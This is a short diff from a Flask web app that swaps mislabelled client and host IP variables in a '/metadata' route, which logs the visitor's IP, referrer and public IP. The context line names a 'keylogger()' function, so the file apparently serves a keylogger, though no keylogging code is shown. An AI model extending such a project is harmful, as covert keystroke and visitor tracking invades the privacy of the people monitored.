@@ -15,9 +15,9 @@ def keylogger():
 
 @app.route('/metadata')
 def metadata():
-    hostIp = request.remote_addr
+    clientIp = request.remote_addr
     hostName = socket.gethostname()
-    clientIp = socket.gethostbyname(hostName)
+    hostIp = socket.gethostbyname(hostName)
     referrer = request.referrer
     publicIp = requests.get('https://api.ipify.org').content.decode('utf8')
 
